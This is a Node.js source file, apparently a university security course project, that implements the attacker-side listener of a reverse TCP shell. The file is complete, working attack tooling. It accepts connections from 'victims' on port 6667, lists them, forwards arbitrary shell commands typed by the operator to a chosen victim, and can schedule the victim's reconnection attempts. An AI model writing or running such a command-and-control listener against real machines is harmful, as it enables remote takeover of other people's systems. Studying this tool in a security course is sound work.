/*
    nodejs
    reverse tcp shell listener

    commands:
  --------------------------------------------------------------------------------------------------
    help
    exit                    ---   quit listener
    list                    ---   list victims
    connect num             ---   connect to one victim
                                  eg 'connect 0' will connect to the first victim in victim list
    schedule n_minutes      ---   schedule attack, ask victim to try to connect to attacker every n_minutes
 */

var net = require("net"); // load tcp library
var readline = require("readline"); // load readline library
var colors = require('colors'); // load color library
var rl = readline.createInterface(process.stdin, process.stdout);
var victims = []; // save victims socket
var current_socket = null;
var prefix = "listener> ".yellow;
var i;

// project introduction
console.log("CS 460 Final Project".gray.bold + "\n" +
            "Reverse TCP Shell".red + "," +" listener for Attacker \n".red +
            "ywang189 - Yiyi Wang ".green + "\n" +
            "cjsmith7 - Christian Smith".green + "\n" +
            "enter " +'help'.blue.bold + " for commands infromation");

if (!String.prototype.startsWith) {
  String.prototype.startsWith = function(searchString, position) {
    position = position || 0;
    return this.lastIndexOf(searchString, position) === position;
  };
}

// continue read input from repl
function continueRepl(){
    rl.setPrompt(prefix, prefix.length);
    rl.prompt();
}

rl.on('line', function(line) {
    line = line.trim();
    if (line === "exit"){
        for(i = 0; i < victims.length; i++){
            victims[i].end(); // quit socket;
        }
        rl.close(); // close repl
    }
    else if (line === "help"){
        console.log("▀▀▀▀▀▀▀▀▀▀▀ Help ▀▀▀▀▀▀▀▀▀▀▀".black.bold + "\n" +
                    "exit                    ---   quit listener \n" +
                    "list                    ---   list victims \n" +
                    "connect num             ---   connect to one victim\n" +
                    "                              eg 'connect 0' will connect to the first victim in victim list\n" +
                    "schedule n_minutes      ---   schedule attack, ask victim to try to connect to attacker every n_minutes");
        continueRepl();
    }
    else if (line === "list"){
        console.log("▀▀▀▀▀▀▀▀▀▀▀ Victim List ▀▀▀▀▀▀▀▀▀▀▀".black.bold);
        for (i = 0; i < victims.length; i++){
            console.log((i).toString().cyan.bold + " -   " + victims[i].name.blue);
        }
        continueRepl();
    }
    else if (line.startsWith("connect ")){
        if (victims.length === 0){
            console.log("No victims available right now");
        }
        else{
            var n = parseInt(line.slice(8));
            try{
                current_socket = victims[n];
                console.log("Victim ".red + current_socket.name.blue + " remote shell opens".red + "\n");
                prefix = colors.yellow(current_socket.remoteAddress + "> ");
            }
            catch(e){
                console.log("Invalid command " + line);
            }
        }
        continueRepl();
    }
    else if (line.startsWith("schedule ")){
        try{
            var minutes = parseInt(line.slice(9));
            current_socket.write("schedule " + minutes); // send schedule minutes
            rl.pause();
        }
        catch(e){
            console.log("Invalid command: " + line);
            continueRepl();
        }
    }
    else{
        if(current_socket){
            current_socket.write(line); // send command
            rl.pause();
        }
        else{
            console.log("No victim chosen, please enter " + 'help'.blue.bold + " for more information");
            continueRepl();
        }
    }
}).on('close', function() {
  console.log('Happy Hack.');
  process.exit(0);
});
rl.setPrompt(prefix, prefix.length);
rl.prompt();

// create server
net.createServer(function(socket){
    // get victim ip:port
    var victim_name = socket.remoteAddress + ":" + socket.remotePort;
    socket.name = victim_name;

    // save to victims
    victims.push(socket);

    // identify victim
    console.log("\nVictim ".red + victim_name.blue + " connected.".red);
    console.log("Run command " + colors.blue("'connect " + (victims.length - 1) + "'") + " to connect to this victim\n");



    // handle incoming message
    socket.on("data", function(data){
        data = data.toString("utf8");
        console.log(data);
        rl.resume();
        continueRepl();
    });

    // victim disconnect
    socket.on("end", function(){
        victims.splice(victims.indexOf(socket), 1);
        console.log("Victim " + socket.name + " disconnected.");
    });

}).listen(6667);
